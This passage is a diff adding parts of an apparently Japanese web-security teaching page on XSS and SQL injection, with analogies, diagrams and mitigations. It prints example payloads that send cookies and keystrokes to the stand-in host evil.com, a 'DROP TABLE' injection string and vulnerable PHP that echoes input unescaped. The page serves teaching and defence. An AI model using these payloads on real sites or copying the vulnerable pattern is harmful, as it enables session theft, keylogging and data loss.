+  </div>
+
+  <!-- タブ4: 危険度・難易度 -->
+  <div class="mpanel" id="tab-danger">
+    <p style="font-size:12.5px;color:#3a3d52;margin-bottom:14px">各攻撃の危険度（被害の深刻さ）・攻撃難易度・発見難易度を5段階で評価。</p>
+    <div id="danger-chart-container" style="overflow-x:auto">
+    <table style="width:100%;border-collapse:collapse;font-size:12px;min-width:700px">
+      <thead>
+        <tr style="background:var(--ink2);color:#fff">
+          <th style="padding:9px 12px;text-align:left;font-size:11px;min-width:160px">攻撃名</th>
+          <th style="padding:9px 12px;text-align:center;font-size:11px;min-width:130px">危険度（被害）</th>
+          <th style="padding:9px 12px;text-align:center;font-size:11px;min-width:130px">攻撃難易度</th>
+          <th style="padding:9px 12px;text-align:center;font-size:11px;min-width:130px">発見難易度</th>
+          <th style="padding:9px 12px;text-align:left;font-size:11px">主な被害</th>
+        </tr>
+      </thead>
+      <tbody id="danger-tbody"></tbody>
+    </table>
+    </div>
+  </div>
+
+  <!-- タブ5: 対策の種類 -->
+  <div class="mpanel" id="tab-defense">
+    <p style="font-size:12.5px;color:#3a3d52;margin-bottom:14px">対策技術を種類別に整理。複数の攻撃に共通する対策もある。</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px">
+      <div style="border:1.5px solid var(--success);border-radius:8px;padding:12px">
+        <div style="font-size:10.5px;font-weight:700;color:var(--success);margin-bottom:8px;display:flex;align-items:center;gap:5px">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          入力・出力のサニタイズ
+        </div>
+        <div style="display:flex;flex-direction:column;gap:4px">
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#eaf7f1;border-radius:4px">HTMLエスケープ → <span class="atk-badge green" style="font-size:9px">XSS</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#eaf7f1;border-radius:4px">CRLF除去 → <span class="atk-badge green" style="font-size:9px">HTTPヘッダi</span><span class="atk-badge green" style="font-size:9px">メールヘッダi</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#eaf7f1;border-radius:4px">パス正規化 → <span class="atk-badge warn" style="font-size:9px">Dir.Tra.</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#eaf7f1;border-radius:4px">シェルメタ文字エスケープ → <span class="atk-badge danger" style="font-size:9px">OS Cmd</span></div>
+        </div>
+      </div>
+      <div style="border:1.5px solid var(--accent2);border-radius:8px;padding:12px">
+        <div style="font-size:10.5px;font-weight:700;color:var(--accent2);margin-bottom:8px;display:flex;align-items:center;gap:5px">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          構造的対策（根本）
+        </div>
+        <div style="display:flex;flex-direction:column;gap:4px">
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#eaf3ff;border-radius:4px">プリペアドステートメント → <span class="atk-badge blue" style="font-size:9px">SQLi</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#eaf3ff;border-radius:4px">OSコマンド非使用 → <span class="atk-badge blue" style="font-size:9px">OS Cmd</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#eaf3ff;border-radius:4px">間接参照 → <span class="atk-badge blue" style="font-size:9px">Dir.Tra.</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#eaf3ff;border-radius:4px">境界チェック → <span class="atk-badge blue" style="font-size:9px">BOF</span></div>
+        </div>
+      </div>
+      <div style="border:1.5px solid var(--gold);border-radius:8px;padding:12px">
+        <div style="font-size:10.5px;font-weight:700;color:var(--warn);margin-bottom:8px;display:flex;align-items:center;gap:5px">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          HTTPヘッダ・ポリシー
+        </div>
+        <div style="display:flex;flex-direction:column;gap:4px">
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#fffaf0;border-radius:4px">CSRFトークン → <span class="atk-badge warn" style="font-size:9px">CSRF</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#fffaf0;border-radius:4px">X-Frame-Options → <span class="atk-badge warn" style="font-size:9px">CJ</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#fffaf0;border-radius:4px">HttpOnly/Secure Cookie → <span class="atk-badge warn" style="font-size:9px">XSS</span><span class="atk-badge warn" style="font-size:9px">Session</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#fffaf0;border-radius:4px">CSP → <span class="atk-badge warn" style="font-size:9px">XSS</span><span class="atk-badge warn" style="font-size:9px">CJ</span></div>
+          <div style="font-size:11px;color:#3a3d52;padding:4px 8px;background:#fffaf0;border-radius:4px">ホワイトリスト → <span class="atk-badge warn" style="font-size:9px">SSRF</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /matrix-wrap -->
+
+</section>
+
+<!-- ================================================================
+     S02〜S12 各攻撃詳細（アコーディオン）
+================================================================ -->
+<section class="section" id="s2">
+<div class="section-header"><span class="s-num red-bg">02</span><h2>XSS — クロスサイトスクリプティング</h2></div>
+<p>XSSは攻撃者が悪意あるスクリプトをWebページに埋め込み、<strong>ユーザのブラウザ上でスクリプトを実行</strong>させる攻撃。被害を受けるのはそのページを閲覧したユーザ。</p>
+
+<!-- XSS 3種類アコーディオン -->
+<div class="atkcard-wrap">
+
+<!-- 反射型 -->
+<div class="atkcard" id="xss-reflected">
+  <div class="atkcard-header" onclick="toggleCard('xss-reflected')">
+    <div class="atkcard-icon-zone" style="background:linear-gradient(135deg,#fde8e8,#fff5f5)">
+      <!-- 反射型アイコン：矢印が跳ね返る -->
+      <svg width="52" height="52" viewBox="0 0 56 56" fill="none">
+        <rect x="4" y="4" width="48" height="48" rx="10" fill="#fde8e8" stroke="#e09090" stroke-width="1.5"/>
+        <!-- URLバー -->
+        <rect x="10" y="12" width="36" height="8" rx="3" fill="white" stroke="#7a1818" stroke-width="1.2"/>
+        <text x="13" y="19" font-size="5" fill="#7a1818" font-family="monospace" font-weight="600">?q=&lt;script&gt;</text>
+        <!-- 矢印右向き -->
+        <path d="M14 28 L32 28" stroke="#7a1818" stroke-width="2" stroke-dasharray="3 2"/>
+        <polygon points="32,24 40,28 32,32" fill="#7a1818" opacity=".7"/>
+        <!-- 跳ね返り矢印 -->
+        <path d="M40 35 Q44 38 40 41 L22 41" stroke="#ff7070" stroke-width="1.8" fill="none"/>
+        <polygon points="22,37 14,41 22,45" fill="#ff7070"/>
+        <!-- 爆発マーク -->
+        <circle cx="42" cy="28" r="5" fill="rgba(255,80,80,.2)" stroke="#ff4040" stroke-width="1.2"/>
+        <line x1="40" y1="26" x2="44" y2="30" stroke="#ff4040" stroke-width="1.5"/>
+        <line x1="44" y1="26" x2="40" y2="30" stroke="#ff4040" stroke-width="1.5"/>
+      </svg>
+    </div>
+    <div class="atkcard-title-zone">
+      <div class="atkcard-name" style="color:var(--danger)">反射型 XSS（Reflected）</div>
+      <div class="atkcard-tagline">URLパラメータにスクリプトを埋め込み、その場限りで実行させる。フィッシングリンクと組み合わせることが多い。</div>
+      <div style="display:flex;gap:5px;margin-top:6px;flex-wrap:wrap">
+        <span class="atk-badge danger" style="font-size:9.5px">URLにスクリプト埋め込み</span>
+        <span class="atk-badge danger" style="font-size:9.5px">DBに保存されない</span>
+        <span class="atk-badge danger" style="font-size:9.5px">フィッシングメール経由</span>
+      </div>
+    </div>
+    <div class="atkcard-chevron" id="xss-reflected-chev">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+    </div>
+  </div>
+  <div class="atkcard-body" id="xss-reflected-body">
+    <div class="detail-grid">
+      <div class="detail-box analogy">
+        <h4>たとえ話</h4>
+        <p>銀行サイトの「検索フォーム」に「お知らせ：<b>あなたの口座が危険です！</b>」と表示させる毒入り看板をURLに仕込み、そのURLのリンクをメールで送りつける。クリックした人だけが毒に当たる。</p>
+        <!-- 反射型XSS イラスト -->
+        <div class="atk-scene">
+          <div class="atk-scene-inner">
+            <div class="atk-lane">
+              <!-- 攻撃者 -->
+              <div class="atk-node">
+                <div class="atk-icon attacker">
+                  <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                    <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                    <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                    <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                    <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                    <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                    <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                    <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                    <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                    <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                    <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                    <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                    <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+                  </svg>
+                </div>
+                <div class="atk-role attacker">攻撃者</div>
+              </div>
+              <!-- 矢印列① & ④ -->
+              <div class="atk-arrowcol">
+                <div class="atk-arrow-pair">
+                  <div class="atk-label danger"><span class="atk-step-no danger">1</span>毒URL送付</div>
+                  <div class="atk-payload danger">?q=&lt;script&gt;evil&lt;/script&gt;</div>
+                  <div class="atk-line danger atk-arrow-r danger"></div>
+                </div>
+                <div class="atk-arrow-pair">
+                  <div class="atk-line dashed danger atk-arrow-l danger"></div>
+                  <div class="atk-label danger"><span class="atk-step-no danger">4</span>Cookie 流出</div>
+                </div>
+              </div>
+              <!-- 被害者 -->
+              <div class="atk-node">
+                <div class="atk-icon victim">
+                  <svg width="38" height="38" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                    <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                  </svg>
+                </div>
+                <div class="atk-role victim">被害者<small>ブラウザ</small></div>
+              </div>
+              <!-- 矢印列② & ③ -->
+              <div class="atk-arrowcol">
+                <div class="atk-arrow-pair">
+                  <div class="atk-label info"><span class="atk-step-no info">2</span>クリック・アクセス</div>
+                  <div class="atk-line info atk-arrow-r info"></div>
+                </div>
+                <div class="atk-arrow-pair">
+                  <div class="atk-line danger atk-arrow-l danger"></div>
+                  <div class="atk-label danger"><span class="atk-step-no danger">3</span>毒HTML 反射 <span class="atk-excl" title="入力検証なし">!</span></div>
+                </div>
+              </div>
+              <!-- サーバ -->
+              <div class="atk-node">
+                <div class="atk-icon server">
+                  <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="-17" y="-16" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                    <rect x="-17" y="-4" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                    <rect x="-17" y="8" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                    <circle cx="-12" cy="-11" r="1.3" fill="#b5821e"/>
+                    <circle cx="-12" cy="1" r="1.3" fill="#b5821e"/>
+                    <circle cx="-12" cy="13" r="1.3" fill="#b5821e"/>
+                    <line x1="-7" y1="-11" x2="13" y2="-11" stroke="#b5821e" stroke-width="1"/>
+                    <line x1="-7" y1="1" x2="13" y2="1" stroke="#b5821e" stroke-width="1"/>
+                    <line x1="-7" y1="13" x2="13" y2="13" stroke="#b5821e" stroke-width="1"/>
+                  </svg>
+                </div>
+                <div class="atk-role server">銀行サーバ<small>入力を反射表示</small></div>
+              </div>
+            </div>
+          </div>
+          <div class="atk-caption">銀行サーバが検索パラメータをそのまま画面に表示するため、毒スクリプトが被害者ブラウザで実行される</div>
+        </div>
+      </div>
+      <div class="detail-box mechanism">
+        <h4>攻撃の仕組み</h4>
+        <p><strong>①</strong> 攻撃者がURLにスクリプトを埋め込んだリンクを作成<br>
+        <strong>②</strong> メールやSNSでユーザに送付(フィッシング)<br>
+        <strong>③</strong> ユーザがクリック → サーバがパラメータをHTMLに出力<br>
+        <strong>④</strong> ブラウザがスクリプト実行 → Cookie窃取</p>
+      </div>
+      <div class="detail-box examples">
+        <h4>具体的な攻撃例</h4>
+        <div class="detail-code"><span class="c">// 攻撃URLの例</span>
+<span class="v">https://shop.example.com/search?q=</span><span class="ng">&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="c">// 脆弱なサーバ側コード（PHP）</span>
+<span class="k">echo</span> <span class="w">"検索結果: " . $_GET['q']</span>; <span class="c">// エスケープなし！</span>
+
+<span class="c">// 生成されるHTML（危険）</span>
+<span class="ng">&lt;p&gt;検索結果: &lt;script&gt;...Cookie窃取...&lt;/script&gt;&lt;/p&gt;</span></div>
+        <p style="font-size:11.5px;margin-top:4px"><strong>実際の被害例：</strong>銀行・ECサイトの検索機能、エラーメッセージを表示する箇所に多い</p>
+      </div>
+      <div class="detail-box defense">
+        <h4>対策</h4>
+        <span class="counter-tag">HTMLエスケープ（出力時）</span>
+        <span class="counter-tag">CSP</span>
+        <span class="counter-tag">HttpOnly Cookie</span>
+        <div class="detail-code"><span class="c">// 安全なコード（PHP）</span>
+<span class="k">echo</span> <span class="ok">htmlspecialchars</span>(<span class="v">$_GET['q'], ENT_QUOTES, 'UTF-8'</span>);
+<span class="c">// &lt; → &amp;lt;  &gt; → &amp;gt;  " → &amp;quot;</span>
+
+<span class="c">// HTTPレスポンスヘッダ</span>
+<span class="w">Content-Security-Policy: script-src 'self'</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 蓄積型 -->
+<div class="atkcard" id="xss-stored">
+  <div class="atkcard-header" onclick="toggleCard('xss-stored')">
+    <div class="atkcard-icon-zone" style="background:linear-gradient(135deg,#f0d8ff,#f8f0ff)">
+      <!-- 蓄積型アイコン：DB + 毒 -->
+      <svg width="52" height="52" viewBox="0 0 56 56" fill="none">
+        <rect x="4" y="4" width="48" height="48" rx="10" fill="#f0d8ff" stroke="#b080e0" stroke-width="1.5"/>
+        <!-- DBシリンダー -->
+        <ellipse cx="28" cy="16" rx="12" ry="4" fill="rgba(160,40,200,.2)" stroke="#8030c0" stroke-width="1.3"/>
+        <path d="M16 16 L16 36 Q16 40 28 40 Q40 40 40 36 L40 16" stroke="#8030c0" stroke-width="1.3" fill="rgba(160,40,200,.08)"/>
+        <path d="M16 23 Q16 27 28 27 Q40 27 40 23" stroke="#8030c0" stroke-width="1.2" fill="none" opacity=".6"/>
+        <path d="M16 30 Q16 34 28 34 Q40 34 40 30" stroke="#8030c0" stroke-width="1.2" fill="none" opacity=".4"/>
+        <!-- 毒マーク（骸骨的） -->
+        <circle cx="28" cy="25" r="4" fill="rgba(200,80,200,.3)" stroke="#8030c0" stroke-width="1.2"/>
+        <circle cx="26" cy="24.5" r="1" fill="#8030c0"/>
+        <circle cx="30" cy="24.5" r="1" fill="#8030c0"/>
+        <path d="M26.5 27 L28 26 L29.5 27" stroke="#8030c0" stroke-width="1" fill="none"/>
+        <!-- 感染広がり矢印 -->
+        <path d="M40 25 L47 20" stroke="#ff4040" stroke-width="1.5" stroke-dasharray="2 1"/>
+        <path d="M40 28 L47 28" stroke="#ff4040" stroke-width="1.5" stroke-dasharray="2 1"/>
+        <path d="M40 31 L47 36" stroke="#ff4040" stroke-width="1.5" stroke-dasharray="2 1"/>
+      </svg>
+    </div>
+    <div class="atkcard-title-zone">
+      <div class="atkcard-name" style="color:#8030c0">蓄積型 XSS（Stored） ← 最も危険</div>
+      <div class="atkcard-tagline">スクリプトをDBに保存。そのページを訪れた<strong>全ユーザ</strong>に対して自動実行される。掲示板・SNS・コメント欄で発生。</div>
+      <div style="display:flex;gap:5px;margin-top:6px;flex-wrap:wrap">
+        <span class="atk-badge purple" style="font-size:9.5px">DBに永続保存</span>
+        <span class="atk-badge purple" style="font-size:9.5px">全訪問者に影響</span>
+        <span class="atk-badge purple" style="font-size:9.5px">掲示板・コメント欄</span>
+      </div>
+    </div>
+    <div class="atkcard-chevron" id="xss-stored-chev">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+    </div>
+  </div>
+  <div class="atkcard-body" id="xss-stored-body">
+    <div class="detail-grid">
+      <div class="detail-box analogy">
+        <h4>たとえ話</h4>
+        <p>銀行の公告掲示板に「スパイカメラが内蔵された偽のお知らせ」を貼り付ける。以降その掲示板を見た<strong>すべての人の情報が抜き取られ続ける</strong>。1回の攻撃で何千人もの被害が出る。</p>
+        <!-- 蓄積型XSS イラスト -->
+        <div class="atk-scene">
+          <div class="atk-scene-inner">
+            <div class="atk-lane">
+              <!-- 攻撃者 -->
+              <div class="atk-node">
+                <div class="atk-icon attacker">
+                  <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                    <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                    <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                    <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                    <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                    <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                    <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                    <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                    <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                    <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                    <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                    <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                    <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+                  </svg>
+                </div>
+                <div class="atk-role attacker">攻撃者</div>
+              </div>
+              <!-- 矢印列① -->
+              <div class="atk-arrowcol">
+                <div class="atk-arrow-pair">
+                  <div class="atk-label danger"><span class="atk-step-no danger">1</span>毒コメント投稿</div>
+                  <div class="atk-payload danger">&lt;script&gt;steal_cookie();&lt;/script&gt;</div>
+                  <div class="atk-line danger atk-arrow-r danger"></div>
+                </div>
+              </div>
+              <!-- 掲示板(DB) -->
+              <div class="atk-node">
+                <div class="atk-icon db">
+                  <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                    <ellipse cx="0" cy="-12" rx="15" ry="4" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.4"/>
+                    <path d="M -15 -12 L -15 12 Q -15 16 0 16 Q 15 16 15 12 L 15 -12" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.4"/>
+                    <path d="M -15 -4 Q -15 0 0 0 Q 15 0 15 -4" fill="none" stroke="#5a1a9e" stroke-width="1.1"/>
+                    <path d="M -15 4 Q -15 8 0 8 Q 15 8 15 4" fill="none" stroke="#5a1a9e" stroke-width="1.1"/>
+                    <text x="0" y="-10" text-anchor="middle" font-size="6" fill="#5a1a9e" font-weight="700">DB</text>
+                  </svg>
+                </div>
+                <div class="atk-role db">掲示板 DB<small>毒保存 <span class="atk-excl">!</span></small></div>
+              </div>
+              <!-- 矢印列② -->
+              <div class="atk-arrowcol">
+                <div class="atk-arrow-pair">
+                  <div class="atk-label purple"><span class="atk-step-no purple">2</span>閲覧時に毒配信</div>
+                  <div class="atk-payload" style="border-color:#b090e0;background:#f0ebff;color:#5a1a9e">全訪問者のブラウザで実行</div>
+                  <div class="atk-line purple atk-arrow-r purple"></div>
+                </div>
+              </div>
+              <!-- 複数被害者スタック -->
+              <div class="atk-victims-stack">
+                <div class="atk-victim-mini">
+                  <div class="atk-mini-icon">
+                    <svg width="22" height="22" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                      <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                    </svg>
+                  </div>
+                  <div class="atk-mini-label">被害者A</div>
+                  <div class="atk-mini-exec">毒実行</div>
+                </div>
+                <div class="atk-victim-mini">
+                  <div class="atk-mini-icon">
+                    <svg width="22" height="22" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                      <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                    </svg>
+                  </div>
+                  <div class="atk-mini-label">被害者B</div>
+                  <div class="atk-mini-exec">毒実行</div>
+                </div>
+                <div class="atk-victim-mini">
+                  <div class="atk-mini-icon">
+                    <svg width="22" height="22" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                      <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                    </svg>
+                  </div>
+                  <div class="atk-mini-label">被害者C</div>
+                  <div class="atk-mini-exec">毒実行</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="atk-caption">一度DBに保存された毒スクリプトが、その後に掲示板を訪問する全ての被害者に配信される (一対多の被害)</div>
+        </div>
+      </div>
+      <div class="detail-box mechanism">
+        <h4>攻撃の仕組み</h4>
+        <p><strong>①</strong> 攻撃者がコメント欄にスクリプトを投稿<br>
+        <strong>②</strong> サーバがエスケープなしでDBに保存<br>
+        <strong>③</strong> 誰かがそのページを開く<br>
+        <strong>④</strong> DBからスクリプト取得 → 全訪問者のブラウザで実行<br>
+        <strong>⑤</strong> Cookie・入力内容が攻撃者サーバへ送信</p>
+      </div>
+      <div class="detail-box examples">
+        <h4>具体的な攻撃例</h4>
+        <div class="detail-code"><span class="c">// 攻撃者のコメント投稿内容</span>
+<span class="ng">素晴らしい記事です！&lt;script&gt;
+  var i=new Image();
+  i.src='https://evil.com/steal?cookie='+document.cookie;
+&lt;/script&gt;</span>
+
+<span class="c">// キーロガー型（フォーム入力を全部送信）</span>
+<span class="ng">&lt;script&gt;
+  document.addEventListener('keypress', function(e){
+    fetch('https://evil.com/log?k='+e.key);
+  });
+&lt;/script&gt;</span></div>
+        <p style="font-size:11.5px;margin-top:4px"><strong>実際の被害例：</strong>海外SNSでのワームスクリプト拡散、ECサイト決済フォームへのキーロガー埋め込み（MageCart攻撃）</p>
+      </div>
+      <div class="detail-box defense">
+        <h4>対策</h4>
+        <span class="counter-tag">保存時サニタイズ</span>
+        <span class="counter-tag">出力時エスケープ</span>
+        <span class="counter-tag">CSP</span>
+        <span class="counter-tag">HttpOnly Cookie</span>
+        <div class="detail-code"><span class="c">// DOMPurify等のサニタイズライブラリ</span>
+<span class="ok">const clean = DOMPurify.sanitize(userInput);</span>
+
+<span class="c">// CSPヘッダ（インラインスクリプト禁止）</span>
+<span class="w">Content-Security-Policy: script-src 'self'; default-src 'self'</span>
+
+<span class="c">// HttpOnly Cookie</span>
+<span class="w">Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /XSS atkcard-wrap -->
+
+</section>
+
+<!-- ================================================================ S03 SQLi ================================================================ -->
+<section class="section" id="s3">
+<div class="section-header"><span class="s-num red-bg">03</span><h2>SQLインジェクション</h2></div>
+<p>入力値にSQL文の断片を混入させ、DBへの<strong>不正なSQL命令を実行</strong>させる攻撃。情報漏洩・認証バイパス・データ削除など被害が甚大。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box analogy">
+    <h4>たとえ話</h4>
+    <p>図書館員(Webアプリ)が「どんな本を探しますか？」と受付で聞き、そのまま司書(DBサーバ)に紙を渡す。通常「吾輩は猫である」と書く紙に、攻撃者は「<b>何でも; その後、全蔵書情報を教えて</b>」と書く。司書は指示通り実行してしまう。</p>
+    <!-- SQLi イラスト: 利用者→図書館員→司書 -->
+    <div class="atk-scene">
+      <div class="atk-scene-inner">
+        <div class="atk-lane">
+          <!-- 攻撃者 -->
+          <div class="atk-node">
+            <div class="atk-icon attacker">
+              <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+              </svg>
+            </div>
+            <div class="atk-role attacker">攻撃者<small>利用者を装う</small></div>
+          </div>
+          <!-- ①入力 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label danger"><span class="atk-step-no danger">1</span>毒入力をフォームへ</div>
+              <div class="atk-payload danger">何でも'; DROP TABLE books --</div>
+              <div class="atk-line danger atk-arrow-r danger"></div>
+            </div>
+            <div class="atk-arrow-pair">
+              <div class="atk-line dashed danger atk-arrow-l danger"></div>
+              <div class="atk-label danger"><span class="atk-step-no danger">4</span>DB全情報が漏洩</div>
+            </div>
+          </div>
+          <!-- 図書館員(Webアプリ) -->
+          <div class="atk-node">
+            <div class="atk-icon webapp">
+              <svg width="34" height="34" viewBox="-18 -16 36 36" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#eaf7f1" stroke="#155f44" stroke-width="1.3"/>
+                <circle cx="0" cy="-8" r="7" fill="#eaf7f1" stroke="#155f44" stroke-width="1.3"/>
+                <rect x="-8" y="-14" width="16" height="5" rx="0.5" fill="#155f44"/>
+              </svg>
+            </div>
+            <div class="atk-role webapp">図書館員<small>Web アプリ</small></div>
+          </div>
+          <!-- ②クエリ転送 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label info"><span class="atk-step-no info">2</span>SQL文をそのまま実行 <span class="atk-excl" title="検証なし">!</span></div>
+              <div class="atk-payload info">SELECT * FROM books WHERE ...</div>
+              <div class="atk-line info atk-arrow-r info"></div>
+            </div>
+            <div class="atk-arrow-pair">
